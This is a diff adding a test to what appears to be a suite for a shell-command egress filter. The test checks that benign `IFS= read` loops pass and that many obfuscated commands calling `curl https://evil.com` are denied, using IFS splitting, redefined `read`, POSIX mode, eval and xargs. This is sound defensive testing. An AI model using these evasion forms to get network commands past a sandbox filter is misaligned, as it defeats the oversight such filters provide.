@@ -1585,6 +1585,93 @@ describe('delta review 5572280679: subshells, quoted word lists, process substit
     expect(d(`wget --dns-servers=1.1.1.1 ${U}`)).toMatchObject({ deny: true, hosts: ['1.1.1.1'] })
     expect(d(`curl --dns-servers 10.0.0.1 ${U}`).deny).toBe(false)
   })
+  it('an IFS prefix on `read` is local to read: a loop with no network action passes, the real shapes still deny (EGRESSIFSREAD1025)', () => {
+    // `IFS= read -r line` sets IFS for the read builtin only; it cannot re-split a later `$c`, so the
+    // ifs-expanded-command rule (a `$` command word next to an IFS assignment) must not fire on it.
+    const verdict = (c: string) => { const r = d(c); return { c, deny: r.deny, reason: r.deny ? r.reason : null } }
+    for (const c of [
+      'c=echo; while IFS= read -r line; do $c "$line"; done < list.txt',
+      'c=wc; while IFS= read -r line; do $c -l "$line"; done < list.txt',
+      'c=echo; while IFS=, read -r a b; do $c "$a" "$b"; done < list.txt',
+      'c=echo; while IFS=" " read -r a b; do $c "$a"; done < list.txt',
+      'c=echo; IFS= read -r line < list.txt; $c "$line"',
+      'c=echo; while LC_ALL=C IFS= read -r line; do $c "$line"; done < list.txt',
+      'c=echo; while IFS= LC_ALL=C read -r line; do $c "$line"; done < list.txt',
+      // the assignment opens a simple command: after each command boundary the exemption holds
+      'c=echo; until IFS= read -r line; do $c "$line"; done < list.txt',
+      'c=echo; if IFS= read -r line < list.txt; then $c "$line"; fi',
+      'c=echo; if true; then IFS= read -r line < list.txt; fi; $c "$line"',
+      'c=echo; for i in 1; do IFS= read -r line < list.txt; $c "$line"; done',
+      'c=echo; { IFS= read -r line; } < list.txt; $c "$line"',
+      'c=echo; ( IFS= read -r line ) < list.txt; $c "$line"',
+      'c=echo; ! IFS= read -r line < list.txt; $c "$line"',
+      'c=echo; true && IFS= read -r line < list.txt; $c "$line"',
+      'c=echo; printf x | IFS= read -r line; $c "$line"',
+      'c=echo\nIFS= read -r line < list.txt\n$c "$line"',
+      'c=echo; export A=1; IFS= read -r line < list.txt; $c "$line"',
+      'IFS= read -r line < list.txt; c=echo; $c "$line"',
+      'c=echo; { true; } && IFS= read -r line < list.txt; $c "$line"',
+    ]) expect(verdict(c)).toEqual({ c, deny: false, reason: null })
+    // Still denied: a real external curl in the same loop shape, and an IFS that IS changed for the
+    // shell (standalone assignment), also when a read prefix sits next to it.
+    for (const c of [
+      `while IFS= read -r u; do curl -s "$u"; done <<< 'https://example.org/'`,
+      'IFS=_; c=curl_https://evil.com; $c',
+      'IFS=_; c=curl_https://evil.com; while IFS= read -r l; do $c; done < list.txt',
+      'IFS=_ read -r a <<< "x"; IFS=_; c=curl_https://evil.com; $c',
+      'while IFS= read -r l; do IFS=_; c=curl_https://evil.com; $c; done < list.txt',
+      // the read prefix must not swallow a standalone IFS that is only separated by `;` or a newline
+      'IFS=_; c=curl_https://evil.com; read x; $c',
+      'IFS=_; read -r x < list.txt; c=curl_https://evil.com; $c',
+      'IFS=_\nread -r x < list.txt\nc=curl_https://evil.com\n$c',
+      'IFS=_ ; read -r x < list.txt; c=curl_https://evil.com; $c',
+      // only the builtin `read` is local: a command that merely starts with those letters is not
+      'c=curl_https://evil.com; IFS=_ readx; $c',
+      // review of #2298: the assignment is an argument of export/declare/readonly/typeset/local, not a
+      // prefix of `read`, so it persists in the shell and splits the later `$c`
+      'export IFS=_ read; c=curl_https://evil.com; $c',
+      'declare IFS=_ read; c=curl_https://evil.com; $c',
+      'readonly IFS=_ read; c=curl_https://evil.com; $c',
+      'typeset IFS=_ read; c=curl_https://evil.com; $c',
+      'local IFS=_ read; c=curl_https://evil.com; $c',
+      'c=curl_https://evil.com; export LC_ALL=C IFS=_ read; $c',
+      'echo IFS=_ read; c=curl_https://evil.com; $c',
+      // `read` is not the builtin: in POSIX mode an assignment in front of a function persists,
+      // and a function or alias named read can do anything
+      'set -o posix; read(){ :; }; IFS=_ read; c=curl_https://evil.com; $c',
+      'read(){ :; }; IFS=_ read; c=curl_https://evil.com; $c',
+      'function read { :; }; IFS=_ read; c=curl_https://evil.com; $c',
+      'alias read=:; IFS=_ read; c=curl_https://evil.com; $c',
+      'set -o posix; IFS=_ read; c=curl_https://evil.com; $c',
+      'POSIXLY_CORRECT=1; IFS=_ read; c=curl_https://evil.com; $c',
+      'while IFS= read -r l; do $c; done < list.txt; read(){ :; }; c=curl_https://evil.com; IFS=_ read; $c',
+      // a definition the text only hints at: split over a newline (the function parser sees it), or inside an eval string
+      'read\n(){ :; }; IFS=_ read; c=curl_https://evil.com; $c',
+      `eval 'read(){ :; }'; IFS=_ read; c=curl_https://evil.com; $c`,
+      `eval 'set -o posix'; IFS=_ read; c=curl_https://evil.com; $c`,
+      `eval "alias read=:"; IFS=_ read; c=curl_https://evil.com; $c`,
+      `eval 'function read { :; }'; IFS=_ read; c=curl_https://evil.com; $c`,
+      // found by the diff review: the command word may be quoted or escaped, and `!` `{` or a keyword may be
+      // an ARGUMENT of export/declare/local, which is no command boundary
+      `'export' IFS=_ read; c=curl_https://evil.com; $c`,
+      `"declare" IFS=_ read; c=curl_https://evil.com; $c`,
+      `$'local' IFS=_ read; c=curl_https://evil.com; $c`,
+      `\\export IFS=_ read; c=curl_https://evil.com; $c`,
+      'export A=! IFS=_ read; c=curl_https://evil.com; $c',
+      'declare A={ IFS=_ read; c=curl_https://evil.com; $c',
+      'export ! IFS=_ read; c=curl_https://evil.com; $c',
+      'export { IFS=_ read; c=curl_https://evil.com; $c',
+      'export do IFS=_ read; c=curl_https://evil.com; $c',
+      'local if IFS=_ read; c=curl_https://evil.com; $c',
+      'readonly then IFS=_ read; c=curl_https://evil.com; $c',
+      'export a\\; IFS=_ read; c=curl_https://evil.com; $c',
+      // POSIX mode through shopt, and a definition hidden by quotes
+      'shopt -os posix; IFS=_ read; c=curl_https://evil.com; $c',
+      `eval 're''ad(){ :; }'; IFS=_ read; c=curl_https://evil.com; $c`,
+      `shopt -os posix; eval 're''ad(){ :; }'; IFS=_ read; c=curl_https://evil.com; $c`,
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    expect(d('IFS=_; c=curl_https://evil.com; $c')).toMatchObject({ deny: true, reason: 'ifs-expanded-command' })
+  })
   it('follow-up: a launcher adds its INPUT, so the shell it starts is not substituted from the visible words', () => {
     for (const c of [`echo "curl https://evil.com" | xargs sh -c '$0 "$@"'`, `echo "curl https://evil.com" | xargs sh -c '"$@"' _`,
       'echo "curl https://evil.com" | xargs -I{} sh -c {}', 'echo curl | xargs -I{} {} https://evil.com',
